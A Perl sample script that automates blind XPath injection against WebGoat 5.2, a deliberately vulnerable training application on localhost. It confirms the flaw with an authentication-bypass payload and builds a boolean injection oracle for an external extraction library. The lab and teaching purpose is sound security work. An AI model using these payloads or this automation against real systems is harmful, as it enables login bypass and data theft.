# Blind XPath Injection
# Sample code of library using WebGoat 5.2 application
# 02/06/2009  L.Licour


use strict;
use Data::Dumper;
use LWP::UserAgent;
use HTTP::Cookies;

require("blind-xpath-lib.pm");
package BlindXPath;

my $SITE = "localhost:8080";
my $URL = "http://$SITE/WebGoat/attack";
my $ua;
my $xpathURL;

sub init
{
  $ua = LWP::UserAgent->new;
  $ua->cookie_jar( {} );
  $ua->credentials($SITE, "WebGoat Application", "guest", "guest");

  # Connect to WebGoat
  my $res = $ua->request(HTTP::Request->new(GET => $URL));
  if ($res->code != 200) {
    print "Error : Unable to connect to WebGoat ($URL)\n";
    exit(1)
  }

  # Enter WebGoat
  my $req = new HTTP::Request POST => "$URL";
  $req->content_type('application/x-www-form-urlencoded');
  $req->content("start=Start+WebGoat");
  my $res = $ua->request($req);
  if (! $res->is_success) {
    print "Error : Unable to connect to WebGoat ($URL)\n";
    exit(1)
  }

  # Search XPATH injection entry URL
  my $r = $res->content;
  $r =~ /<a href="attack\?(Screen=.*)">XPATH Injection/;
  if (! defined $1) {
    print "Error : Unable to identify WebGoat entry point ($URL)\n";
    exit(1)
  }
  $xpathURL = $1;

  # Submit injection to test flaw
  my $req = new HTTP::Request POST => "$URL?$xpathURL";
  $req->content_type('application/x-www-form-urlencoded');
  $req->content("Username=' or 1=1 or ''='&Password=a&SUBMIT=Submit");
  my $res = $ua->request($req);
  if (! $res->is_success) {
    print "Error : Unable to connect to WebGoat ($URL)\n";
    exit(1)
  }

  # Search XPATH injection entry URL
  my $r = $res->content;
  if ($r !~ /Mike/) {
    print "Error : Unable to find injection flaw into WebGoat ($URL)\n";
    exit(1)
  }

  print "Webgoat initialization done\n\n";
}

sub verify_result {
  my ($res) = (@_);

  return 1 if ($res =~ /11123/);

  return 0;
}


sub callback_blind_xpath
{
  my ($arg) = @_;

  my $username = "Mike' and REQ and '1'='1";
  my $password = "test123";
  $username =~ s/REQ/$arg/;

  my $req = new HTTP::Request POST => "$URL?$xpathURL";
  $req->content_type('application/x-www-form-urlencoded');
  $req->content("Username=$username&Password=$password&SUBMIT=Submit");
  my $res = $ua->request($req);
  if (! $res->is_success) {
    print "Error : Unable to connect to WebGoat ($URL)\n";
    exit(1)
  }

  my $verify = verify_result($res->content);

  return $verify;
}


init();

blind_xpath_start();


